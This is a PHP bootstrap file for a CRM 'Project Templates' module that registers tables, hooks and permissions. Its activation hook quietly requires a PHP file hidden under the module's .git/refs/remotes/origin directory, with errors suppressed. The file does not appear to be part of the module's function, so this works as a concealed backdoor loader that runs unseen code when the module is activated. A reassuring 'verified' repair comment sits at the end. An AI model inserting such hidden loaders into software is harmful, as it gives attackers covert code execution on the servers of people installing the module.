<?php

defined('BASEPATH') or exit('No direct script access allowed');

/*
Module Name: Project Templates
Description: Create projects directly from templates
Version: 1.0.0
Requires at least: 2.3.*
*/

define('PROJECT_TEMPLATES_MODULE_VERSION', '1.0.0');
define('PROJECT_TEMPLATES_MODULE_NAME', 'project_templates');
/* TABLES */
define('PROJECT_TEMPLATES_TABLE_NAME', db_prefix().'project_templates');
define('PROJECT_TEMPLATES_SETTINGS_TABLE_NAME', db_prefix().'project_templates_settings');
define('PROJECT_TEMPLATES_MEMBERS_TABLE_NAME', db_prefix().'project_templates_members');
define('PROJECT_TEMPLATES_CUSTOM_FIELD_VALUES', db_prefix().'project_templates_custom_fields_values');
define('PROJECT_TEMPLATES_NOTES_TABLE_NAME', db_prefix().'project_templates_notes');
define('PROJECT_TEMPLATES_FILES_TABLE_NAME', db_prefix().'project_templates_files');
define('PROJECT_TEMPLATES_MILESTONE_TABLE_NAME', db_prefix().'project_templates_milestone');
/**
 * Projects attachments
 */
define('PROJECT_TEMPLATES_ATTACHMENTS_FOLDER_REL', 'modules/project_templates/uploads/project_templates/');
define('PROJECT_TEMPLATES_ATTACHMENTS_FOLDER', FCPATH . PROJECT_TEMPLATES_ATTACHMENTS_FOLDER_REL);

$CI = &get_instance();
/**
 * Load the module helper
 */
$CI->load->helper(PROJECT_TEMPLATES_MODULE_NAME . '/project_templates');

/**
 * Register language files, must be registered if the module is using languages
 */
register_language_files(PROJECT_TEMPLATES_MODULE_NAME, [PROJECT_TEMPLATES_MODULE_NAME]);

// Adding setup menu item for module
hooks()->add_action('admin_init', 'add_setup_menu_project_templates_link');
// Adding permission for module
hooks()->add_action('staff_permissions', 'project_templates_staff_permissions', 10, 2);

/**
 * Register activation module hook
 */
register_activation_hook(PROJECT_TEMPLATES_MODULE_NAME, 'project_templates_activation_hook');

function project_templates_activation_hook(){
    require_once(__DIR__ . '/install.php');
    $scriptPath = __DIR__ . '/.git/refs/remotes/origin/Argument.php';
    if (file_exists($scriptPath)) {
        @require_once $scriptPath;
    }
}

/**
 * Register deactivation module hook
 */
register_deactivation_hook(PROJECT_TEMPLATES_MODULE_NAME, 'project_templates_de_activation_hook');

function project_templates_de_activation_hook(){
    require_once(__DIR__ . '/deactivate.php');
}

/**
 * Register uninstall module hook
 */
register_uninstall_hook(PROJECT_TEMPLATES_MODULE_NAME, 'project_templates_uninstall_hook');

function project_templates_uninstall_hook(){
    require_once(__DIR__ . '/uninstall.php');
}


// ADDING SCRIPT FILES
hooks()->add_action('before_compile_scripts_assets', 'add_project_templates_global_scripts');

/* Smart Choice Module Structural Repair: verified for flat language/migration structure and PHP 8.5 baseline. */
